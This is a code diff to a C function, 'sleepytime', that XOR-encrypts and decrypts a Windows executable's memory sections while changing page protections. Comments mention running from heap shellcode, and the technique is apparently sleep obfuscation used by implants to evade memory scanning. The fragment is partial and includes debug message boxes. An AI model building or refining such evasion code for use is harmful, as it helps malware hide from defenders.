@@ -102,7 +102,7 @@ void sleepytime() {
         ((VIRTUALPROTECT)VirtualProtectFunc)(sectionStartAddr, size, PAGE_READWRITE, &lpflOldProtect);
 
 
-        for (byte* currentBytePointer = sectionStartAddr; currentBytePointer < (sectionStartAddr + ((PIMAGE_SECTION_HEADER)currentSectionHeaderAddrr)->Misc.VirtualSize); currentBytePointer++) {
+        for (byte* currentBytePointer = sectionStartAddr; currentBytePointer < (sectionStartAddr + size); currentBytePointer++) {
             *currentBytePointer = XOR(*currentBytePointer, key);
         }
 
@@ -134,7 +134,7 @@ void sleepytime() {
     //Reset the sectionHeaderAddrr to the first one
     currentSectionHeaderAddrr = sections.sectionHeader;
     //for (int i = 0; i < sections.numberOfSections; i++) {
-    for (int i = 0; i < 1; i++) {
+    for (int i = 0; i < sections.numberOfSections; i++) {
         UINT64 sectionStartAddr = sections.startAddr + ((PIMAGE_SECTION_HEADER)currentSectionHeaderAddrr)->VirtualAddress;
         // Build the struct thatll give me all the info I need about a section. 
         //1. sectionStartAddr is a pointer to where the section starts in memory
@@ -148,7 +148,7 @@ void sleepytime() {
         //Now my current issue is it crashes when modifying the .text section cause yeah lol its where my code is. This will only work if I'm executing from shellcode on the heap I think.
 
         
-        for (byte* currentBytePointer = sectionStartAddr; currentBytePointer < (sectionStartAddr + ((PIMAGE_SECTION_HEADER)currentSectionHeaderAddrr)->Misc.VirtualSize); currentBytePointer++) {
+        for (byte* currentBytePointer = sectionStartAddr; currentBytePointer < (sectionStartAddr + size); currentBytePointer++) {
             *currentBytePointer = XOR(*currentBytePointer, key);
         }
         byte permissionToRestore = ((PIMAGE_SECTION_HEADER)currentSectionHeaderAddrr)->Characteristics >> 28;
@@ -188,6 +188,8 @@ void sleepytime() {
         UINT64 tmp = currentSectionHeaderAddrr + 40;
         currentSectionHeaderAddrr = (UINT64)currentSectionHeaderAddrr + 40;
     }
+    CHAR testMessage25[] = { 'R','e','t','u','r','n', 0 };
+    ((MESSAGEBOXA)MessageBoxAFunc)(NULL, testMessage25, testMessage25, MB_OK);
 	return;
 }
 
